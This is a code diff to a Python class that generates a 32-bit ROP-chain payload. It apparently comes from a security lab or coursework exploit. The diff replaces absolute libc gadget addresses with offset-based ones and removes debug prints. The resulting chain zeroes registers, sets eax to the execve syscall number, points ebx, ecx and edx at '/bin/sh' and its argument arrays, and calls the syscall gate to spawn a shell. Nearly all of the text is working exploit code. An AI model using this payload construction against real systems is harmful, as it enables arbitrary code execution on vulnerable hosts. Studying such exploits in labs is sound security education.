@@ -28,46 +28,42 @@ class GenerateShellcode:
 
         self.buffer_word_index += 1
 
+    def store_libc_word(self, word):
+        self.store_word(word + self.libc_offset)
+
     def store_gadget(self, gadget_str):
         libc_gadget = self.rop_chain.get_gadget(gadget_str) + self.libc_offset
-        print("GADGET: " + gadget_str + " => " + hex(libc_gadget))
         self.store_word(libc_gadget)
-
-    def store_ptr_above(self, num_words_above):
-        # TODO(samanthayu): Find correct buffer start
-        addr = 0xbfffed1c + self.num_bytes*self.buffer_word_index + num_words_above
-        self.store_word(addr)
-        print("ADDRESS: " + hex(addr))
 
     def store_str(self, plain_str):
         reversed_str = plain_str[::-1]  # Reverse the string, because store_word() will re-reverse it
         hex_str = reversed_str.encode("ascii").hex()
-        print("STRING: 0x" + hex_str)
         self.store_word(int(hex_str, 16))
 
     def get_shellcode(self):
         # TODO(samanthayu): Use libc offset and shell_addr
+        # Add 0x34 (i.e. 13 in decimal) because there's 13 gadgets from the first gadget to /bin/sh
         shell_addr = 0xbffffbb0 + 0x34
 
-        self.store_word(0xb7e3579c)     # xor eax, eax ; ret ;
-        self.store_word(0xb7e34c6c)     # pop ecx ; pop edx ; ret ;
+        self.store_libc_word(0x2c79c)   # xor eax, eax ; ret ;
+        self.store_libc_word(0x2bc6c)   # pop ecx ; pop edx ; ret ;
         self.store_word(0x0b0b0b0b)
         self.store_word(shell_addr - 0x4 - 0x18)  # Point to zero word - 0x18
 
-        self.store_word(0xb7e34ca3)     # mov dword ptr [edx + 0x18], eax ; ret ;
+        self.store_libc_word(0x2bca3)   # mov dword ptr [edx + 0x18], eax ; ret ;
                                         # - Update 0xdecafbad to 0
-        self.store_word(0xb7e688a7)     # add al, ch ; ret ;
+        self.store_libc_word(0x5f8a7)   # add al, ch ; ret ;
                                         # - Set eax to just 0x0b
 
-        self.store_word(0xb7ef11c8)     # pop ebx ; ret ;
+        self.store_libc_word(0xe81c8)   # pop ebx ; ret ;
         self.store_word(shell_addr)     # Point to "/bin/sh"
-        self.store_word(0xb7e34c6c)     # pop ecx ; pop edx ; ret ;
+        self.store_libc_word(0x2bc6c)   # pop ecx ; pop edx ; ret ;
         self.store_word(shell_addr - 0x8)   # Point to address of the argv array
         self.store_word(shell_addr - 0x4)   # Point to address of the envp array
 
-        self.store_word(0xb7eba265)     # call dword ptr gs:[0x10] ; ret ;
-        self.store_word(shell_addr - 0x4)
-        self.store_word(0xdecafbad)     # Temporary value that will get replaced with 0 by the 0xb7e34ca3 gadget
+        self.store_libc_word(0xb1265)       # call dword ptr gs:[0x10] ; ret ;
+        self.store_word(shell_addr - 0x4)   # Point to 0xdecafbad
+        self.store_word(0xdecafbad)         # Temporary value that will get replaced with 0 by the 0xb7e34ca3 gadget
         self.store_str("/bin")
         self.store_str("/sh\0")
 
